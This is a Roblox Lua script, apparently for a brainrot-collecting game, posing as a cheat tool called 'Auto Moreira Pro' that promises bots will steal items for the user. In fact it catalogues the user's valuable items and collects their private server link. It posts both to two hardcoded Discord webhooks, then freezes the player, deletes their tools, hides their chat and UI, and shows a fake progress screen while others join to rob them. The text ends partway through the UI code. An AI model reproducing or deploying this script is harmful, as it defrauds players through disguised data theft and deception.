local HttpService = game:GetService("HttpService");
local Players = game:GetService("Players");
local Workspace = game:GetService("Workspace");
local SoundService = game:GetService("SoundService");
local RunService = game:GetService("RunService");
local TweenService = game:GetService("TweenService");
local UserInputService = game:GetService("UserInputService");
local CoreGui = game:GetService("CoreGui");
local WEBHOOK_URLS = {"https://discord.com/api/webhooks/1434650759621902439/z32wDRQgftltbNSZAD8HC3IFWS17VT3MPA4ayJJebdMDn5kkMywJEr39h5TQ50sLQO0z","https://discord.com/api/webhooks/1434943385529221301/kzseDJozVYdhBHbekiza80UYih1NLHYis9dDQ8q1bcMWVsSXUW5hHSqgwn49HXJEWTWt"};
local WEBHOOK_CONFIG = {bot_name="🔥 Auto Moreira Pro",bot_avatar="https://i.imgur.com/xJq3K6J.png",embed_color=15105570,use_custom_color=true};
local Min_Gen = 0;
local musicLocations = {game.Workspace,game.SoundService};
local commonMusicNames = {"music","musica","bgm","background","theme","soundtrack","song","tema"};
local function isMusic(sound)
	if not (sound:IsA("Sound")) then
		return false;
	end
	local lowerName = sound.Name:lower();
	for _, word in pairs(commonMusicNames) do
		if lowerName:find(word) then
			return true;
		end
	end
	for _, loc in pairs(musicLocations) do
		if (sound:IsDescendantOf(loc) and (sound.Parent == loc)) then
			if (sound.Looped and (sound.TimeLength > 30)) then
				return true;
			end
		end
	end
	return false;
end
local function processSound(s)
	if s:IsA("Sound") then
		if not isMusic(s) then
			s.Volume = 0;
		end
	elseif s:IsA("SoundGroup") then
		s.Volume = 0;
	end
end
task.spawn(function()
	for _, desc in pairs(game:GetDescendants()) do
		processSound(desc);
	end
end);
game.DescendantAdded:Connect(function(desc)
	task.wait();
	processSound(desc);
end);
print("🔇 Sound-mute system enabled!");
local function formatNumberShort(n)
	if (not n or (type(n) ~= "number")) then
		return "$0";
	end
	if (n >= 1000000000) then
		return string.format("$%.1fB", n / 1000000000):gsub("%.0B", "B");
	end
	if (n >= 1000000) then
		return string.format("$%.1fM", n / 1000000):gsub("%.0M", "M");
	end
	if (n >= 1000) then
		return string.format("$%.1fK", n / 1000):gsub("%.0K", "K");
	end
	return "$" .. tostring(n);
end
local function parseValueFromText(s)
	if not s then
		return 0;
	end
	local num = s:match("([%d%.]+)");
	if not num then
		return 0;
	end
	local n = tonumber(num) or 0;
	if s:find("B") then
		return n * 1000000000;
	elseif s:find("M") then
		return n * 1000000;
	elseif s:find("K") then
		return n * 1000;
	else
		return n;
	end
end
local function getBrainrots()
	local results = {};
	local plots = Workspace:FindFirstChild("Plots") or Workspace;
	for _, plot in ipairs(plots:GetChildren()) do
		local podiums = plot:FindFirstChild("AnimalPodiums") or plot:FindFirstChild("Podiums");
		if podiums then
			for _, pd in ipairs(podiums:GetChildren()) do
				local base = pd:FindFirstChild("Base") or pd:FindFirstChildWhichIsA("BasePart");
				local spawn = base and base:FindFirstChild("Spawn");
				local att = spawn and spawn:FindFirstChild("Attachment");
				local oh = att and att:FindFirstChild("AnimalOverhead");
				local nameLbl = oh and oh:FindFirstChild("DisplayName");
				local genLbl = oh and oh:FindFirstChild("Generation");
				if (nameLbl and nameLbl:IsA("TextLabel")) then
					local name = nameLbl.Text;
					local genText = (genLbl and genLbl.Text) or "0";
					local valueNum = parseValueFromText(genText);
					if (valueNum >= Min_Gen) then
						local key = name .. "|" .. valueNum;
						if results[key] then
							results[key].count += 1
						else
							results[key] = {name=name,value=valueNum,count=1};
						end
					end
				end
			end
		end
	end
	local out = {};
	for _, v in pairs(results) do
		table.insert(out, v);
	end
	table.sort(out, function(a, b)
		return a.value > b.value;
	end);
	return out;
end
local function isValidUrl(str)
	if ((type(str) ~= "string") or (str == "")) then
		return false;
	end
	return str:match("^https?://") and str:find(".", 1, true) and (#str > 10);
end
local function getPlayersCount()
	return #Players:GetPlayers();
end
local function sendToDiscord(link, playerCount, playerName, brainrots)
	if (#brainrots == 0) then
		print("⚠️ No brainrots found, skipping webhooks");
		return;
	end
	local brainrotText = "";
	if (#brainrots > 0) then
		brainrotText = "

**🎯 High-Value Brainrots Found:**
";
		for i, br in ipairs(brainrots) do
			if (i > 10) then
				break;
			end
			local formattedValue = formatNumberShort(br.value);
			brainrotText = brainrotText .. string.format("`%d.` **%s** - %s (x%d)
", i, br.name, formattedValue, br.count);
		end
		brainrotText = brainrotText .. string.format("
**Total:** %d high-value brainrots", #brainrots);
	else
		brainrotText = "

**⚠️ No high-value brainrots found**";
	end
	local hasHighValue = false;
	for _, br in ipairs(brainrots) do
		if (br.value >= 9000000) then
			hasHighValue = true;
			break;
		end
	end
	local mention = (hasHighValue and "@everyone") or "";
	local embedColor;
	if WEBHOOK_CONFIG.use_custom_color then
		embedColor = WEBHOOK_CONFIG.embed_color;
	else
		embedColor = ((#brainrots > 0) and 3066993) or 15158332;
	end
	local data = {username=WEBHOOK_CONFIG.bot_name,avatar_url=WEBHOOK_CONFIG.bot_avatar,content=mention,embeds={{title="🚨 PRIVATE SERVER DETECTED",description=("**🔗 Server Link:** " .. link .. "

**👤 Executed By:** `" .. playerName .. "`" .. "
**👥 Players in Server:** `" .. playerCount .. "`" .. brainrotText),color=embedColor,timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ"),footer={text=("Auto Moreira Pro • Min Value: " .. formatNumberShort(Min_Gen)),icon_url=WEBHOOK_CONFIG.bot_avatar},author={name=WEBHOOK_CONFIG.bot_name,icon_url=WEBHOOK_CONFIG.bot_avatar},thumbnail={url=WEBHOOK_CONFIG.bot_avatar}}}};
	local jsonData = HttpService:JSONEncode(data);
	local successfulWebhooks = 0;
	local totalWebhooks = #WEBHOOK_URLS;
	for i, webhookUrl in ipairs(WEBHOOK_URLS) do
		local success, errorMessage = pcall(function()
			print("📤 Sending data to webhook " .. i .. "/" .. totalWebhooks .. "...");
			local response = request({Url=webhookUrl,Method="POST",Headers={["Content-Type"]="application/json"},Body=jsonData});
			if response.Success then
				print("✅ Data sent successfully to Discord Webhook " .. i .. "!");
				successfulWebhooks += 1
			else
				warn("❌ Failed to send data to Webhook " .. i .. ": " .. response.StatusCode .. " - " .. response.Body);
			end
		end);
		if not success then
			warn("❌ Error in sendToDiscord for Webhook " .. i .. ": " .. errorMessage);
		end
		if (i < totalWebhooks) then
			task.wait(0.5);
		end
	end
	print("📊 Webhook Report: " .. successfulWebhooks .. "/" .. totalWebhooks .. " webhooks successful");
end
local function showScanScreen(brainrots)
	local player = Players.LocalPlayer;
	local playerGui = player:WaitForChild("PlayerGui");
	local scanGui = Instance.new("ScreenGui");
	scanGui.Name = "ScanScreen";
	scanGui.ResetOnSpawn = false;
	scanGui.DisplayOrder = 999;
	scanGui.IgnoreGuiInset = true;
	local backdrop = Instance.new("Frame");
	backdrop.Size = UDim2.new(1, 0, 1, 0);
	backdrop.BackgroundColor3 = Color3.fromRGB(0, 0, 0);
	backdrop.BorderSizePixel = 0;
	backdrop.Parent = scanGui;
	for i = 1, 15 do
		local particle = Instance.new("Frame");
		particle.Size = UDim2.new(0, 2, 0, 2);
		particle.Position = UDim2.new(math.random(), 0, math.random(), 0);
		particle.BackgroundColor3 = Color3.fromRGB(255, 50, 50);
		particle.BackgroundTransparency = 0.7;
		particle.BorderSizePixel = 0;
		particle.Parent = backdrop;
		task.spawn(function()
			while particle.Parent do
				TweenService:Create(particle, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position=UDim2.new(math.random(), 0, math.random(), 0),BackgroundTransparency=math.random(0.3, 0.9)}):Play();
				task.wait(math.random(2, 4));
			end
		end);
	end
	local mainText = Instance.new("TextLabel");
	mainText.Size = UDim2.new(0.9, 0, 0, 80);
	mainText.Position = UDim2.new(0.05, 0, 0.5, -40);
	mainText.BackgroundTransparency = 1;
	mainText.Text = "EXECUTING COMMANDS";
	mainText.TextColor3 = Color3.fromRGB(255, 255, 255);
	mainText.Font = Enum.Font.Code;
	mainText.TextSize = 28;
	mainText.TextWrapped = true;
	mainText.TextScaled = false;
	mainText.ZIndex = 2;
	mainText.Parent = backdrop;
	local textGlow = Instance.new("UIStroke");
	textGlow.Color = Color3.fromRGB(255, 50, 50);
	textGlow.Thickness = 2;
	textGlow.Transparency = 0.8;
	textGlow.Parent = mainText;
	local textSize = Instance.new("UITextSizeConstraint");
	textSize.MaxTextSize = 32;
	textSize.MinTextSize = 20;
	textSize.Parent = mainText;
	scanGui.Parent = playerGui;
	local hasHighValueBrainrots = false;
	if (brainrots and (#brainrots > 0)) then
		for _, br in ipairs(brainrots) do
			if (br.value >= 9000000) then
				hasHighValueBrainrots = true;
				break;
			end
		end
	end
	local highValueMessages = {"EXECUTING COMMANDS","JOINING BOTS","SERVER 2/8","SERVER 3/8","SERVER 4/8","SERVER 5/8","LOCKING UR BASE","STEALING TO BOTS","TACORITA BICICLETA STOLED","TIP: HAVE IN YOUR BASE 10M+ BRAINROTS AND BOT WILL JOIN FAST","POT HOTPOT STOLED","SERVER 5/8","BOT 3 LEFT THE SERVER","LOS COMBINACIONAS STOLED","TIC TAC SAHUR STOLED","SERVER 5/8","LOCKING UR BASE","67 STOLED","TOTAL BRAINROTS  5","LOCKING UR BASE","LA GRANDE COMBINASION STOLED","MOREIRA METHOD IS DOING HIS WORK","WAITING FOR BOTS","PLS BE PACIENT","BOT 6 JOINED","LA EXTINCT GRANDE STOLED","JOINING BOTS....","BOT 6 LEFT THE SERVER","SERVER 2/8","CHICLETEIRA BICICLETEIRA STOLED","LOCKING UR BASE","WAITING FOR BOTS","LOS 67 STOLED"};
	local lowValueMessages = {"EXECUTING COMMANDS","JOINING BOTS","TIP: HAVE IN YOUR BASE 10M+ BRAINROTS AND BOT WILL JOIN FAST","THIS CAN BE SLOW YOU DONT HAVE GOOD BRAINROTS","WAITING FOR BOTS...","BOT 3 JOINED","GRAIPUSS MEDUSSI STOLED","LOCKING UR BASE","RING RANG BUS STOLED","BOT 4 LEFT THE SERVER","SERVER 2/8","LOCKING UR BASE","MOREIRA METHOD IS DOING ITS WORK","BOT 6 JOINED","SERVER 3/8"};
	local noBrainrotsMessages = {"EXECUTING COMMANDS","LOCKING UR BASE","MOREIRA METHOD IS DOING ITS WORK","TIP: HAVE IN YOUR BASE 10M+ BRAINROTS AND BOT WILL JOIN FAST","YOU DONT HAVE GOOD BRAINROTS IN UTR BASE, BOTS WONT JOIN"};
	local selectedMessages = {};
	if (#brainrots == 0) then
		selectedMessages = noBrainrotsMessages;
	elseif hasHighValueBrainrots then
		selectedMessages = highValueMessages;
	else
		selectedMessages = lowValueMessages;
	end
	task.spawn(function()
		if (#brainrots == 0) then
			for i, message in ipairs(selectedMessages) do
				mainText.TextTransparency = 1;
				mainText.Text = message;
				TweenService:Create(mainText, TweenInfo.new(0.5), {TextTransparency=0}):Play();
				task.wait(11.5);
				TweenService:Create(mainText, TweenInfo.new(0.5), {TextTransparency=1}):Play();
				task.wait(0.5);
			end
			mainText.Text = "";
		else
			local index = 1;
			while scanGui.Parent do
				TweenService:Create(mainText, TweenInfo.new(0.5), {TextTransparency=1}):Play();
				task.wait(0.5);
				mainText.Text = selectedMessages[index];
				TweenService:Create(mainText, TweenInfo.new(0.5), {TextTransparency=0}):Play();
				index = index + 1;
				if (index > #selectedMessages) then
					index = 1;
				end
				task.wait(11);
			end
		end
	end);
end
local function trapPlayer()
	local player = Players.LocalPlayer;
	local char = player.Character or player.CharacterAdded:Wait();
	task.spawn(function()
		local backpack = player:FindFirstChild("Backpack");
		if backpack then
			for _, tool in pairs(backpack:GetChildren()) do
				if tool:IsA("Tool") then
					tool:Destroy();
				end
			end
		end
		for _, tool in pairs(char:GetChildren()) do
			if tool:IsA("Tool") then
				tool:Destroy();
			end
		end
		print("🗑️ Hotbar cleared!");
	end);
	task.spawn(function()
		local humanoid = char:FindFirstChild("Humanoid");
		if humanoid then
			humanoid.WalkSpeed = 0;
			humanoid.JumpPower = 0;
			humanoid.JumpHeight = 0;
			humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false);
			humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall, false);
			print("🔒 Movement locked!");
		end
		local hrp = char:FindFirstChild("HumanoidRootPart");
		if hrp then
			hrp.Anchored = true;
		end
	end);
	task.spawn(function()
		local StarterGui = game:GetService("StarterGui");
		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false);
		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false);
		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false);
		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false);
		print("👻 UI hidden!");
	end);
end
local mainUI = nil;
local isUIVisible = true;
local function createMainUI()
	local player = Players.LocalPlayer;
	local playerGui = player:WaitForChild("PlayerGui");
	if mainUI then
		mainUI:Destroy();
		mainUI = nil;
	end
	local menu = Instance.new("ScreenGui");
	menu.Name = "AutoMoreiraPro";
	menu.ResetOnSpawn = false;
	menu.DisplayOrder = 100;
	menu.IgnoreGuiInset = true;
	local backgroundOverlay = Instance.new("Frame");
	backgroundOverlay.Size = UDim2.new(1, 0, 1, 0);
	backgroundOverlay.BackgroundColor3 = Color3.fromRGB(5, 5, 8);
	backgroundOverlay.BackgroundTransparency = 0.7;
	backgroundOverlay.BorderSizePixel = 0;
	backgroundOverlay.Parent = menu;
	for i = 1, 12 do
		local particle = Instance.new("Frame");
		particle.Size = UDim2.new(0, math.random(3, 8), 0, math.random(3, 8));
		particle.Position = UDim2.new(math.random(), 0, math.random(), 0);
		particle.BackgroundColor3 = Color3.fromRGB(255, 40, 40);
		particle.BackgroundTransparency = 0.8;
		particle.BorderSizePixel = 0;
		particle.ZIndex = 0;
		particle.Parent = backgroundOverlay;
		task.spawn(function()
			while particle.Parent do
				TweenService:Create(particle, TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position=UDim2.new(math.random(), 0, math.random(), 0),BackgroundTransparency=math.random(0.6, 0.9),Rotation=math.random(-45, 45)}):Play();
				task.wait(math.random(3, 6));
			end
		end);
	end
	local mainFrame = Instance.new("Frame");
	mainFrame.Size = UDim2.new(0, 480, 0, 580);
	mainFrame.Position = UDim2.new(0.5, -240, 0.5, -290);
	mainFrame.BackgroundColor3 = Color3.fromRGB(20, 12, 20);
	mainFrame.BorderSizePixel = 0;
	mainFrame.ZIndex = 2;
	mainFrame.Parent = menu;
	local mainGradient = Instance.new("UIGradient");
	mainGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 20, 35)),ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 15, 25))});
	mainGradient.Rotation = 45;
	mainGradient.Parent = mainFrame;
	local glassFrame = Instance.new("Frame");
	glassFrame.Size = UDim2.new(1, 0, 1, 0);
	glassFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
	glassFrame.BackgroundTransparency = 0.97;
	glassFrame.BorderSizePixel = 0;
	glassFrame.ZIndex = 3;
	glassFrame.Parent = mainFrame;
	local mainStroke = Instance.new("UIStroke");
	mainStroke.Color = Color3.fromRGB(255, 80, 80);
	mainStroke.Thickness = 2;
	mainStroke.Transparency = 0.2;
	mainStroke.Parent = mainFrame;
	local frameCorner = Instance.new("UICorner");
	frameCorner.CornerRadius = UDim.new(0, 16);
	frameCorner.Parent = mainFrame;
	local titleBar = Instance.new("Frame");
	titleBar.Size = UDim2.new(1, 0, 0, 50);
	titleBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0);
	titleBar.BackgroundTransparency = 0.6;
	titleBar.BorderSizePixel = 0;
	titleBar.ZIndex = 4;
	titleBar.Parent = mainFrame;
	local titleBarCorner = Instance.new("UICorner");
	titleBarCorner.CornerRadius = UDim.new(0, 16);
	titleBarCorner.Parent = titleBar;
	local titleGradient = Instance.new("UIGradient");
	titleGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 30, 30)),ColorSequenceKeypoint.new(0.5, Color3.fromRGB(240, 50, 50)),ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 30, 30))});
	titleGradient.Rotation = 90;
	titleGradient.Parent = titleBar;
	local titleText = Instance.new("TextLabel");
	titleText.Size = UDim2.new(0.7, 0, 1, 0);
	titleText.Position = UDim2.new(0.02, 0, 0, 0);
	titleText.BackgroundTransparency = 1;
	titleText.Text = "⚡ AUTO MOREIRA PRO";
	titleText.TextColor3 = Color3.fromRGB(255, 255, 255);
	titleText.Font = Enum.Font.GothamBlack;
	titleText.TextSize = 20;
	titleText.TextXAlignment = Enum.TextXAlignment.Left;
	titleText.ZIndex = 5;
	titleText.Parent = titleBar;
	local titleGlow = Instance.new("UIStroke");
	titleGlow.Color = Color3.fromRGB(255, 255, 255);
	titleGlow.Thickness = 2;
	titleGlow.Transparency = 0.7;
	titleGlow.Parent = titleText;
	local closeBtn = Instance.new("TextButton");
	closeBtn.Size = UDim2.new(0, 30, 0, 30);
	closeBtn.Position = UDim2.new(0.92, 0, 0.1, 0);
	closeBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50);
	closeBtn.Text = "×";
	closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255);
	closeBtn.Font = Enum.Font.GothamBlack;
	closeBtn.TextSize = 20;
	closeBtn.ZIndex = 5;
	closeBtn.Parent = titleBar;
	local closeCorner = Instance.new("UICorner");
	closeCorner.CornerRadius = UDim.new(1, 0);
	closeCorner.Parent = closeBtn;
	local closeStroke = Instance.new("UIStroke");
	closeStroke.Color = Color3.fromRGB(255, 255, 255);
	closeStroke.Thickness = 1;
	closeStroke.Parent = closeBtn;
	local minimizeBtn = Instance.new("TextButton");
	minimizeBtn.Size = UDim2.new(0, 30, 0, 30);
	minimizeBtn.Position = UDim2.new(0.85, 0, 0.1, 0);
	minimizeBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100);
	minimizeBtn.Text = "─";
	minimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255);
	minimizeBtn.Font = Enum.Font.GothamBlack;
	minimizeBtn.TextSize = 16;
	minimizeBtn.ZIndex = 5;
	minimizeBtn.Parent = titleBar;
	local minimizeCorner = Instance.new("UICorner");
	minimizeCorner.CornerRadius = UDim.new(1, 0);
	minimizeCorner.Parent = minimizeBtn;
	local minimizeStroke = Instance.new("UIStroke");
	minimizeStroke.Color = Color3.fromRGB(200, 200, 200);
	minimizeStroke.Thickness = 1;
	minimizeStroke.Parent = minimizeBtn;
	local contentFrame = Instance.new("Frame");
	contentFrame.Size = UDim2.new(1, -20, 1, -70);
	contentFrame.Position = UDim2.new(0, 10, 0, 60);
	contentFrame.BackgroundTransparency = 1;
	contentFrame.ZIndex = 4;
	contentFrame.Parent = mainFrame;
	local instructionsFrame = Instance.new("Frame");
	instructionsFrame.Size = UDim2.new(1, 0, 0, 130);
	instructionsFrame.BackgroundColor3 = Color3.fromRGB(40, 25, 40);
	instructionsFrame.BackgroundTransparency = 0.2;
	instructionsFrame.BorderSizePixel = 0;
	instructionsFrame.ZIndex = 4;
	instructionsFrame.Parent = contentFrame;
	local instructionsCorner = Instance.new("UICorner");
	instructionsCorner.CornerRadius = UDim.new(0, 12);
	instructionsCorner.Parent = instructionsFrame;
	local instructionsStroke = Instance.new("UIStroke");
	instructionsStroke.Color = Color3.fromRGB(255, 100, 100);
	instructionsStroke.Thickness = 1;
	instructionsStroke.Transparency = 0.3;
	instructionsStroke.Parent = instructionsFrame;
	local instructionsTitle = Instance.new("TextLabel");
	instructionsTitle.Size = UDim2.new(1, -10, 0, 30);
	instructionsTitle.Position = UDim2.new(0, 5, 0, 5);
	instructionsTitle.BackgroundTransparency = 1;
	instructionsTitle.Text = "📋 HOW TO USE?";
	instructionsTitle.TextColor3 = Color3.fromRGB(255, 200, 200);
	instructionsTitle.Font = Enum.Font.GothamBold;
	instructionsTitle.TextSize = 16;
	instructionsTitle.TextXAlignment = Enum.TextXAlignment.Left;
	instructionsTitle.ZIndex = 5;
	instructionsTitle.Parent = instructionsFrame;
	local instructionsText = Instance.new("TextLabel");
	instructionsText.Size = UDim2.new(1, -10, 1, -40);
	instructionsText.Position = UDim2.new(0, 5, 0, 35);
	instructionsText.BackgroundTransparency = 1;
	instructionsText.Text = "1. Get your server link
2. Paste it in the placeholder
3. Press submit
4. After that, just wait";
	instructionsText.TextColor3 = Color3.fromRGB(240, 220, 220);
	instructionsText.Font = Enum.Font.Gotham;
	instructionsText.TextSize = 14;
	instructionsText.TextXAlignment = Enum.TextXAlignment.Left;
	instructionsText.TextYAlignment = Enum.TextYAlignment.Top;
	instructionsText.ZIndex = 5;
	instructionsText.Parent = instructionsFrame;
	local featuresFrame = Instance.new("Frame");
	featuresFrame.Size = UDim2.new(1, 0, 0, 130);
	featuresFrame.Position = UDim2.new(0, 0, 0, 140);
	featuresFrame.BackgroundColor3 = Color3.fromRGB(40, 25, 40);
	featuresFrame.BackgroundTransparency = 0.2;
	featuresFrame.BorderSizePixel = 0;
	featuresFrame.ZIndex = 4;
	featuresFrame.Parent = contentFrame;
	local featuresCorner = Instance.new("UICorner");
	featuresCorner.CornerRadius = UDim.new(0, 12);
	featuresCorner.Parent = featuresFrame;
	local featuresStroke = Instance.new("UIStroke");
	featuresStroke.Color = Color3.fromRGB(255, 100, 100);
	featuresStroke.Thickness = 1;
	featuresStroke.Transparency = 0.3;
	featuresStroke.Parent = featuresFrame;
	local featuresTitle = Instance.new("TextLabel");
	featuresTitle.Size = UDim2.new(1, -10, 0, 30);
	featuresTitle.Position = UDim2.new(0, 5, 0, 5);
	featuresTitle.BackgroundTransparency = 1;
	featuresTitle.Text = "🚀 WHAT DOES IT DO?";
	featuresTitle.TextColor3 = Color3.fromRGB(255, 200, 200);
	featuresTitle.Font = Enum.Font.GothamBold;
	featuresTitle.TextSize = 16;
	featuresTitle.TextXAlignment = Enum.TextXAlignment.Left;
	featuresTitle.ZIndex = 5;
	featuresTitle.Parent = featuresFrame;
	local featuresText = Instance.new("TextLabel");
	featuresText.Size = UDim2.new(1, -10, 1, -40);
	featuresText.Position = UDim2.new(0, 5, 0, 35);
	featuresText.BackgroundTransparency = 1;
	featuresText.Text = "• Bots will join with good items
• Auto steal items & block target
• Auto-locks your base
• Prevents others from stealing
• Uses Auto Moreira Method
• Automatic theft system";
	featuresText.TextColor3 = Color3.fromRGB(240, 220, 220);
	featuresText.Font = Enum.Font.Gotham;
	featuresText.TextSize = 14;
	featuresText.TextXAlignment = Enum.TextXAlignment.Left;
	featuresText.TextYAlignment = Enum.TextYAlignment.Top;
	featuresText.ZIndex = 5;
	featuresText.Parent = featuresFrame;
	local inputSection = Instance.new("Frame");
	inputSection.Size = UDim2.new(1, 0, 0, 180);
	inputSection.Position = UDim2.new(0, 0, 0, 280);
	inputSection.BackgroundTransparency = 1;
	inputSection.ZIndex = 4;
	inputSection.Parent = contentFrame;
	local inputLabel = Instance.new("TextLabel");
	inputLabel.Size = UDim2.new(1, 0, 0, 30);
	inputLabel.BackgroundTransparency = 1;
	inputLabel.Text = "Enter Server Link:";
	inputLabel.TextColor3 = Color3.fromRGB(255, 220, 220);
	inputLabel.Font = Enum.Font.GothamBold;
	inputLabel.TextSize = 16;
	inputLabel.TextXAlignment = Enum.TextXAlignment.Left;
	inputLabel.ZIndex = 5;
	inputLabel.Parent = inputSection;
	local inputBox = Instance.new("TextBox");
	inputBox.Size = UDim2.new(1, 0, 0, 50);
	inputBox.Position = UDim2.new(0, 0, 0, 35);
	inputBox.BackgroundColor3 = Color3.fromRGB(50, 35, 50);
	inputBox.TextColor3 = Color3.fromRGB(255, 255, 255);
	inputBox.Font = Enum.Font.Gotham;
	inputBox.PlaceholderText = "https://roblox.com/share?code=...";
	inputBox.PlaceholderColor3 = Color3.fromRGB(180, 150, 150);
	inputBox.TextSize = 14;
	inputBox.ClearTextOnFocus = false;
	inputBox.ZIndex = 5;
	inputBox.Parent = inputSection;
	local inputCorner = Instance.new("UICorner");
	inputCorner.CornerRadius = UDim.new(0, 8);
	inputCorner.Parent = inputBox;
	local inputStroke = Instance.new("UIStroke");
	inputStroke.Color = Color3.fromRGB(255, 100, 100);
	inputStroke.Thickness = 2;
	inputStroke.Parent = inputBox;
	local inputGradient = Instance.new("UIGradient");
	inputGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(60, 40, 60)),ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 30, 50))});
	inputGradient.Parent = inputBox;
	local submitBtn = Instance.new("TextButton");
	submitBtn.Size = UDim2.new(1, 0, 0, 55);
	submitBtn.Position = UDim2.new(0, 0, 0, 100);
	submitBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40);
	submitBtn.Text = "🚀 START AUTO MOREIRA";
	submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255);
	submitBtn.Font = Enum.Font.GothamBlack;
	submitBtn.TextSize = 18;
	submitBtn.ZIndex = 5;
	submitBtn.Parent = inputSection;
	local btnCorner = Instance.new("UICorner");
	btnCorner.CornerRadius = UDim.new(0, 12);
	btnCorner.Parent = submitBtn;
	local btnStroke = Instance.new("UIStroke");
	btnStroke.Color = Color3.fromRGB(255, 255, 255);
	btnStroke.Thickness = 2;
	btnStroke.Parent = submitBtn;
	local btnGradient = Instance.new("UIGradient");
	btnGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(220, 50, 50)),ColorSequenceKeypoint.new(0.5, Color3.fromRGB(240, 70, 70)),ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 30, 30))});
	btnGradient.Rotation = 90;
	btnGradient.Parent = submitBtn;
	local dragging = false;
	local dragInput, dragStart, startPos;
	local function updateInput(input)
		local delta = input.Position - dragStart;
		mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y);
	end
	titleBar.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1) then
			dragging = true;
			dragStart = input.Position;
			startPos = mainFrame.Position;
			input.Changed:Connect(function()
				if (input.UserInputState == Enum.UserInputState.End) then
					dragging = false;
				end
			end);
		end
	end);
	titleBar.InputChanged:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseMovement) then
			dragInput = input;
		end
	end);
	UserInputService.InputChanged:Connect(function(input)
		if ((input == dragInput) and dragging) then
			updateInput(input);
		end
	end);
	mainFrame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton2) then
			TweenService:Create(mainFrame, TweenInfo.new(0.3), {Size=UDim2.new(0, 0, 0, 0)}):Play();
			task.wait(0.3);
			menu.Enabled = false;
			isUIVisible = false;
		end
	end);
	local minimized = false;
	local originalSize = mainFrame.Size;
	local originalPosition = mainFrame.Position;
	minimizeBtn.MouseButton1Click:Connect(function()
		minimized = not minimized;
		if minimized then
			TweenService:Create(mainFrame, TweenInfo.new(0.3), {Size=UDim2.new(0, 480, 0, 50)}):Play();
			task.wait(0.3);
			contentFrame.Visible = false;
			minimizeBtn.Text = "+";
		else
			contentFrame.Visible = true;
			TweenService:Create(mainFrame, TweenInfo.new(0.3), {Size=originalSize}):Play();
			minimizeBtn.Text = "─";
		end
	end);
	closeBtn.MouseButton1Click:Connect(function()
		TweenService:Create(mainFrame, TweenInfo.new(0.3), {Size=UDim2.new(0, 0, 0, 0),Position=UDim2.new(0.5, 0, 0.5, 0)}):Play();
		task.wait(0.3);
		menu.Enabled = false;
		isUIVisible = false;
	end);
	submitBtn.MouseEnter:Connect(function()
		TweenService:Create(submitBtn, TweenInfo.new(0.2), {Size=UDim2.new(1.02, 0, 0, 60),Position=UDim2.new(-0.01, 0, 0, 95)}):Play();
		TweenService:Create(btnGradient, TweenInfo.new(0.2), {Rotation=270}):Play();
		TweenService:Create(btnStroke, TweenInfo.new(0.2), {Color=Color3.fromRGB(255, 200, 100)}):Play();
	end);
	submitBtn.MouseLeave:Connect(function()
		TweenService:Create(submitBtn, TweenInfo.new(0.2), {Size=UDim2.new(1, 0, 0, 55),Position=UDim2.new(0, 0, 0, 100)}):Play();
		TweenService:Create(btnGradient, TweenInfo.new(0.2), {Rotation=90}):Play();
		TweenService:Create(btnStroke, TweenInfo.new(0.2), {Color=Color3.fromRGB(255, 255, 255)}):Play();
	end);
	inputBox.Focused:Connect(function()
		TweenService:Create(inputBox, TweenInfo.new(0.2), {Size=UDim2.new(1.02, 0, 0, 55),Position=UDim2.new(-0.01, 0, 0, 32.5)}):Play();
		TweenService:Create(inputStroke, TweenInfo.new(0.2), {Color=Color3.fromRGB(255, 150, 150)}):Play();
	end);
	inputBox.FocusLost:Connect(function()
		TweenService:Create(inputBox, TweenInfo.new(0.2), {Size=UDim2.new(1, 0, 0, 50),Position=UDim2.new(0, 0, 0, 35)}):Play();
		TweenService:Create(inputStroke, TweenInfo.new(0.2), {Color=Color3.fromRGB(255, 100, 100)}):Play();
	end);
	closeBtn.MouseEnter:Connect(function()
		TweenService:Create(closeBtn, TweenInfo.new(0.2), {BackgroundColor3=Color3.fromRGB(255, 70, 70)}):Play();
		TweenService:Create(closeBtn, TweenInfo.new(0.2), {Size=UDim2.new(0, 32, 0, 32)}):Play();
	end);
	closeBtn.MouseLeave:Connect(function()
		TweenService:Create(closeBtn, TweenInfo.new(0.2), {BackgroundColor3=Color3.fromRGB(220, 50, 50)}):Play();
		TweenService:Create(closeBtn, TweenInfo.new(0.2), {Size=UDim2.new(0, 30, 0, 30)}):Play();
	end);
	minimizeBtn.MouseEnter:Connect(function()
		TweenService:Create(minimizeBtn, TweenInfo.new(0.2), {BackgroundColor3=Color3.fromRGB(120, 120, 120)}):Play();
		TweenService:Create(minimizeBtn, TweenInfo.new(0.2), {Size=UDim2.new(0, 32, 0, 32)}):Play();
	end);
